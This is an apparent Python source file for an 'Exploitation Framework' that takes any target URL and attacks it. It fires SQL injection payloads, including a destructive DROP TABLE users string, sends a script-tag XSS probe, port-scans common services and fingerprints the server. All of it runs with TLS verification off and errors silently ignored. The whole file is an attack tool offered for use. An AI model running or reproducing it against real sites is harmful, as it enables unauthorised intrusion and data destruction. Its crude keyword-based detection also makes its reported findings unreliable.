import requests
import socket
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from utils.colors import Colors

class ExploitFramework:
    def __init__(self):
        self.colors = Colors()
        self.session = requests.Session()
    
    def run(self):
        print(f"""
{self.colors.RED}
╔══════════════════════════════════════════════════╗
║              EXPLOITATION FRAMEWORK             ║
║               🛠️  MULTI-VECTOR 🛠️               ║
╚══════════════════════════════════════════════════╝{self.colors.RESET}
        """)
        
        target = input(f"{self.colors.CYAN}[?] Enter target URL: {self.colors.WHITE}").strip()
        
        print(f"\n{self.colors.YELLOW}[!] Starting comprehensive scan...{self.colors.RESET}")
        
        # Run all scans
        self.sql_injection_scan(target)
        self.xss_scan(target)
        self.port_scan(target)
        self.info_gathering(target)
        
        input(f"\n{self.colors.CYAN}[+] Press Enter to continue...{self.colors.RESET}")
    
    def sql_injection_scan(self, target):
        print(f"\n{self.colors.RED}[1] SQL Injection Testing{self.colors.RESET}")
        payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--"]
        
        for payload in payloads:
            try:
                test_url = f"{target}?id={payload}"
                response = self.session.get(test_url, timeout=5, verify=False)
                
                if "error" in response.text.lower() or "mysql" in response.text.lower():
                    print(f"{self.colors.GREEN}[✓] SQLi Vulnerability Found: {payload}{self.colors.RESET}")
            except:
                pass
    
    def xss_scan(self, target):
        print(f"\n{self.colors.RED}[2] XSS Vulnerability Testing{self.colors.RESET}")
        payload = "<script>alert('XSS')</script>"
        
        try:
            test_url = f"{target}?q={payload}"
            response = self.session.get(test_url, timeout=5, verify=False)
            
            if payload in response.text:
                print(f"{self.colors.GREEN}[✓] XSS Vulnerability Found!{self.colors.RESET}")
        except:
            pass
    
    def port_scan(self, target):
        print(f"\n{self.colors.RED}[3] Port Scanning{self.colors.RESET}")
        domain = target.replace('http://', '').replace('https://', '').split('/')[0]
        
        try:
            ip = socket.gethostbyname(domain)
            ports = [21, 22, 80, 443, 3306, 3389]
            
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    print(f"{self.colors.GREEN}[✓] Port {port} - OPEN{self.colors.RESET}")
        except:
            pass
    
    def info_gathering(self, target):
        print(f"\n{self.colors.RED}[4] Information Gathering{self.colors.RESET}")
        
        try:
            response = self.session.get(target, timeout=10, verify=False)
            
            # Server info
            server = response.headers.get('Server', 'Unknown')
            print(f"{self.colors.CYAN}Server: {self.colors.WHITE}{server}")
            
            # Technologies
            if 'PHP' in response.text:
                print(f"{self.colors.CYAN}Technology: {self.colors.WHITE}PHP")
            if 'WordPress' in response.text:
                print(f"{self.colors.CYAN}Technology: {self.colors.WHITE}WordPress")
                
        except Exception as e:
            print(f"{self.colors.RED}[!] Info gathering failed: {e}{self.colors.RESET}")